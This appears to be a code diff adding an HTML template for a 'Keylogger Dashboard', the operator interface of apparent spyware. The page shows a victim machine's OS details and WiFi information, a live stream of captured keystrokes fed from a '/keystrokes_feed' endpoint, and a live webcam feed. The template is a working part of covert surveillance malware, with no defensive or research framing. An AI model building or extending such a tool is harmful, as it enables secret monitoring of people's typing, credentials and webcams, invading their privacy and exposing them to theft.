@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Dashboard</title>
+</head>
+<body>
+    <h1>Keylogger Dashboard</h1>
+
+    <h2>System Information:</h2>
+    <ul>
+        <li>OS: {{ system_info['OS'] }}</li>
+        <li>OS Version: {{ system_info['OS Version'] }}</li>
+        <!-- Add more system information items as needed -->
+    </ul>
+
+    <h2>WiFi Information:</h2>
+    <pre>{{ wifi_info }}</pre>
+
+    <h2>Live Keystrokes: Comming soon</h2>
+    <div id="liveKeystrokes"></div>
+    <p id="live_keystrokes"></p>
+
+    <h2>Live Webcam Feed:</h2>
+    <img src="{{ url_for('video_feed') }}" alt="Webcam Feed" width="640" height="480">
+
+   <script>
+    const eventSource = new EventSource("/keystrokes_feed");
+
+    eventSource.onmessage = function(event) {
+        document.getElementById("live_keystrokes").innerText = event.data;
+    };
+
+    eventSource.onerror = function(error) {
+        console.error("EventSource failed:", error);
+        eventSource.close();
+    };
+</script>
+
+</body>
+</html>
